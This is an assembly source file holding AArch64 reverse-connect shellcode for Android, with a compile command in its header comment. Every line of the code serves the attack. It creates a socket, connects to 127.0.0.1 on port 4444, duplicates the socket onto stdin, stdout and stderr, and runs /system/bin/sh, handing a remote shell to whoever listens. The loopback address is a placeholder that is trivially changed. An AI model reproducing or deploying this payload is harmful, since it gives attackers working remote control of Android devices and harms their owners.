/*
 * AArch64 reverse connect shellcode for Android.
 *
 * Compile with aarch64-linux-android-as reverse.S -o reverse.o
 */

.section .text
.global _start

_start:
    // socket(2, 1, 0)
    mov x0, #2
    mov x1, #1
    mov x2, #0
    mov x8, #198    // socket = 198
    svc #0          // x0 = result sockfd
    mov x4, x0      // save sockfd in x4

    // connect(x0, &sockaddr, 16)
    adr x1, struct
    mov x2, #16
    mov x8, #203    // connect = 203
    svc #0

    // dup3(sockfd, 0, 0)
    mov x8, #24     // x8 = 24 (dup3)
    mov x0, x4      // x4 is the saved sockfd
    mov x1, #0      // 1 = 0 (stdin)
    mov x2, #0      // flags = 0
    svc #0
    // dup3(sockfd, 1, 0)
    mov x0, x4      // x4 is the saved sockd
    mov x1, #1      // x1 = 1 (stdout)
    mov x2, #0      // flags = 0
    svc #0
    // dup3(sockfd, 2, 0)
    mov x0, x4      // 4 is the saved sockfd
    mov x1, #2      // x1 = 2 (stderr)
    mov x2, #0      // flags = 0
    svc #0

    // execve("/system/bin/sh", ["/system/bin/sh",NULL], 0)
    adr x0, binsh
    str x0, [sp]
    mov x1, sp
    mov x2, #0
    mov x8, #221     // execve = 221
    svc #0

failed:
    b failed

struct:
.ascii "\x02\x00"       // AF_INET 0xff will be NULLed
.ascii "\x11\x5c"       // port number 4444
.byte 127,0,0,1         // IP address
binsh:
.ascii "/system/bin/sh\x00\x00"
.dword 0
